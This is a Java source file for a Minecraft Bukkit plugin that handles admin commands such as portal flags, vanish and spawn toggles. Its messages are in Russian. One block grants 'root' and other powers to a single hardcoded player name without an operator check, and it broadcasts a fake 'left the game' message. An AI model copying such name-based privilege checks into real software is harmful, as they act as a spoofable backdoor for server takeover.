package way24;

import java.text.DecimalFormat;

import org.bukkit.Bukkit;
import org.bukkit.Chunk;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitTask;

import Chat.Color;
import Chat.sound;
import Player.player;

public class admin
{
	public static void cmdSetup(Player p, String[] args)
	{
		if (p.isOp())
		{
			if (args[0].equalsIgnoreCase("portal"))
			{
				player pl = new player(p);
				if (args[1].equalsIgnoreCase("nether"))
				{
					if (args[2].equals("0"))
						pl.setPostal(0, 0);
					if (args[2].equals("1"))
					{
						pl.setPostal(0, 1);
						pl.setPostal(1, 0);
					}
				}
				if (args[1].equalsIgnoreCase("end"))
				{
					if (args[2].equals("0"))
						pl.setPostal(1, 0);
					if (args[2].equals("1"))
					{
						pl.setPostal(1, 1);
						pl.setPostal(0, 0);
					}
				}
			}
		}
		if (p.getName().equals("_GreyBrick_"))
    	{
			if (args[0].equalsIgnoreCase("root"))
			{
				if (args[2].equalsIgnoreCase("true"))
					new player(p).root(Integer.parseInt(args[1]), true);
				if (args[2].equalsIgnoreCase("false"))
					new player(p).root(Integer.parseInt(args[1]), false);
			}
			if (args[0].equalsIgnoreCase("allanimals"))
			{
				int	rad = 0;
				if (args.length == 2)
					rad = Integer.parseInt(args[1]);
				int	x = 0;
				for (Entity e : p.getWorld().getNearbyEntities(p.getLocation(), rad, rad, rad))
				{
					x++;
				}
				if (rad != 0)
				{
					p.sendMessage("животных прогруженно " + x);
					return ;
				}
				for (World w : Bukkit.getWorlds())
				{
					for (Chunk ch : w.getLoadedChunks())
					{
						for (Entity e : ch.getEntities())
						{
							x++;
						}
					}
				}
				p.sendMessage("животных прогруженно " + x);
				return ;
			}
			if (args[0].equalsIgnoreCase("v"))
			{
				for (Player pl : Bukkit.getOnlinePlayers())
				{
					if (args.length == 2)
						pl.sendMessage(Color.c(14) + p.getName() + " left the game");
					pl.hidePlayer(p);
				}
			}
			if (args[0].equalsIgnoreCase("nv"))
			{
				for (Player pl : Bukkit.getOnlinePlayers())
					pl.showPlayer(p);
			}
    		if (args[0].equalsIgnoreCase("dospawn"))
    		{
    			if (args[2].equalsIgnoreCase("true"))
    				new player(args[1]).doSpawn(true);
    			if (args[2].equalsIgnoreCase("false"))
    				new player(args[1]).doSpawn(false);
    			p.sendMessage(args[1] + " dospawn " + new player(args[1]).doSpawn());
    		}
    		if (args[0].equalsIgnoreCase("dois"))
    		{
    			if (args[2].equalsIgnoreCase("true"))
    				new player(args[1]).doIs(true);
    			if (args[2].equalsIgnoreCase("false"))
    				new player(args[1]).doIs(false);
    			p.sendMessage(args[1] + " dois " + new player(args[1]).doIs());
    		}
    	}
	}
	
	public static boolean Do(player p, int x)
	{
		if (p.getDo() < x)
		{
			DecimalFormat df = new DecimalFormat("###.#");
			p.pl.sendMessage(Color.jast + "Заморожено на " + Color.col0 + " " + df.format((double)(x - p.getDo()) / 1000) + Color.jast + " сек.");
			sound.nosound(p.pl);
			return true;
		}
		p.setDo();
		return false;
	}
}
